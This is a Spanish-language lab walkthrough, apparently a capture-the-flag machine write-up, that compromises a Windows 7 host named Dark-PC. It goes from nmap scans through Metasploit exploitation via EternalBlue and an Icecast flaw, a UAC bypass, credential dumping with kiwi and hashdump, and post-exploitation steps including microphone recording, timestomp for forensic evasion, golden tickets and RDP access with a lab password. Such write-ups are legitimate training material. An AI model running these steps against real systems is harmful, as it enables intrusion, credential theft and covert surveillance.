
---
 - Realizamos el escaneo de todos los puertos abiertos 

 ```bash
 PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 125
139/tcp   open  netbios-ssn   syn-ack ttl 125
445/tcp   open  microsoft-ds  syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125
5357/tcp  open  wsdapi        syn-ack ttl 125
8000/tcp  open  http-alt      syn-ack ttl 125
49152/tcp open  unknown       syn-ack ttl 125
49153/tcp open  unknown       syn-ack ttl 125
49154/tcp open  unknown       syn-ack ttl 125
49158/tcp open  unknown       syn-ack ttl 125
49159/tcp open  unknown       syn-ack ttl 125
49161/tcp open  unknown       syn-ack ttl 125
 ```

- Realizamos el escaneo de scripts de reconocimiento y versiones de los puertos extraídos:

```java
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2025-10-27T22:20:32+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2025-10-26T21:52:50
|_Not valid after:  2026-04-27T21:52:50
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-27T17:20:18-05:00
| smb2-time: 
|   date: 2025-10-27T22:20:17
|_  start_date: 2025-10-27T21:52:28
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:de:f5:66:99 (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h14m59s, deviation: 2h30m01s, median: -1s
```


---
#### Forma de Explotación 1 

- Aplicando el script de reconocimiento de vulnerabilidad de nmap me aparece lo siguiente en donde parece que el servicio 445 es vulnerable (ms17-010), teniendo como vía de explotación la vulnerabilidad de *Eternal Blue* 

```java
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

- Abrimos la consola de metaesploit y procedemos 

```bash
search ms17-010   # Buscamos la vulnerabilidad de eternal blue
use 0
set RHOSTS <IpVictima> 
set LHOST <IpAtacante>
run 

# Nos abre una sesion de meterpreter ya configurado para el usuario administrador sin necesidad de escalar privilegios
```


---

#### Forma de Explotación 2

- Vemos que el puerto 8000 esta asociado a un servicio llamado *Icecast* el cual es un servicio de streaming por lo que procedemos a buscar una vulnerabilidad de este servicio en la web reflejando que:

- Link :  [https://www.cvedetails.com](https://www.cvedetails.com/cve/CVE-2004-1561/)

![[Pasted image 20251027174029.png]]

*CVE*: CVE-2004-1561 | *Impact Score:* 6.4

- Buscamos la vulnerabilidad en metasploit:

```bash
search icecast    # Buscando por el servicio
search CVE-2004-1561 # Buscando por la vulnerabilidad
```

- Encontramos el modulo de explotación de *exploit/windows/http/icecast_header* y explotamos el servicio de la siguiente manera:

```bash
use 0
set RHOSTS <Ipvictima>
set LHOST <IpAtacante>
run
```

- Por lo que al explotar la vulnerabilidad vemos que nos da un shell bajo el usuario de *Dark-PC* o *dark*

![[Pasted image 20251027174848.png]]


- Algunos comandos que podemos aplicar en la sesión de meterpreter son los siguientes_

```bash
meterpreter >
				sysinfo      # Informacion del sistema asi como su arquitectura
				
```


##### Escalada de Privilegios

- Una ves teniendo Acceso a la maquina procedemos a la escalda de privilegios de la sesión de meterpreter de la siguiente forma:

```bash
meterpreter >
				run post/multi/recon/local_exploit_suggester
```

- Esto nos arrojara varios exploit que facilitaran la escalada de privilegios como los siguientes, sin embargo el modulo que nos interesa es el modulo 2 *exploit/windows/local/bypassuac_eventvwr*

![[Pasted image 20251027175938.png]]


- Procedemos a la escalda de privilegios

```bash
background    # Dejamos la session de meterpreter que tenemos actualmente 
use exploit/windows/local/bypassuac_eventvwr   # Usamos el exploit de Escalada de privilegios que habiamos encontrado
set SESSION 1     # Definimos la sesion que teniamos activa
set RHOSTS <IpVictima>
set LHOST <IpAtacante>
set LPORT <PuertoAtacante>
run

# Se nos abrira una sesion con mejores permisos

meterpreter >
				getprivs    # Nos muestra los permisos de los cuales tenemos propiedades
				
# el permiso "SeTakeOwnershipPrivilege" nos permite tomar propiedad de los archivos
```

- Procedemos a la escalda del usuario administrador o *nt authority system*

```bash
meterpreter >
			ps    # Esto nos mostrara los procesos que esta corriendo el usuario administrador en busqueda de lsass el cual permite la      autenticacion de windows
```

![[Pasted image 20251027181537.png]]

- Para poder acceder a este servicio, necesitamos otro con la misma arquitectura al cual tengamos acceso, uno de estos puede ser el servicio de impresión el cual es 
					*1376  688   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe*

```bash
meterpreter >
			migrate -N spoolsv.exe   # Migramos a este proceso 
			getuid    # Miramos que usuario somos 
			load kiwi # Cargamos la herramienta de kiwi para el volcado de credenciales ya que tenemos permiso de administrador
			help  # Ahora podremos ver una nueva lista de comandos correspondientes a kiwi 
			creds_all  # Revelamos todas las credenciales del sistema
```


![[Pasted image 20251027182609.png]]


##### Post Explotación

```bash
meterpreter >
			hashdump     # Nos muestra todos los hashes de contraseñas alojados en el sistema 
			screenshare  # Nos muestra la pantalla en tiempo real
			record_mic   # Graba el microfono en tiempo real
			timestomp    # Manipula los regitros de tiempo en los archivos del sistema, es util para evadir rastreos forenses
			golden_ticket_create   # Es del modulo de kiwi y permite crear una autenticacion permanente
```

![[Pasted image 20251027184413.png]]

```bash
meterpreter >
			run post/windows/manage/enable_rdp  # Modulo para la activacion del remote desktop
			
# Con el modulod de activacion del escritorio remoto ya podriamos acceder de la siguiente manera

xfreerdp /u:dark /p:Password01! /v:10.201.11.96:3389

```